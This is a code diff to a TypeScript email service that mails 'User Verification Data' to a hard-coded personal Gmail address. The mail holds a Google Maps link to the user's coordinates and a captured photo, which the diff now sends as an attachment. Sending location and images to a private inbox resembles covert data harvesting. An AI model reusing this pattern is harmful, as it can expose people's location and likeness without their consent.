@@ -8,15 +8,11 @@ export class CollectService {
   async sendEmail(data: any) {
     const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
 
-    // image ko base64 me convert (Resend ke liye safe)
-    const photoBase64 = data.photo?.buffer
-      ? data.photo.buffer.toString('base64')
-      : null;
-
     await this.resend.emails.send({
-      from: 'onboarding@resend.dev', // default verified sender
+      from: 'onboarding@resend.dev',
       to: ['manishkumr101k@gmail.com'],
       subject: '📸 User Verification Data',
+
       html: `
         <h2>User Verification</h2>
 
@@ -31,15 +27,19 @@ export class CollectService {
         <p><b>Google Maps:</b>
         <a href="${mapLink}" target="_blank">Open Location</a></p>
 
-        ${
-          photoBase64
-            ? `<p><b>Captured Photo:</b><br/>
-               <img src="data:image/jpeg;base64,${photoBase64}" width="300"/></p>`
-            : ''
-        }
+        <p><b>Captured Photo:</b></p>
+        <img src="cid:user-photo" width="300"/>
 
         <p><b>Time:</b> ${new Date().toLocaleString()}</p>
       `,
+
+      attachments: [
+        {
+          filename: 'photo.jpg',
+          content: data.photo.buffer.toString('base64'),
+          contentId:'user-photo',
+        },
+      ],
     });
   }
 }
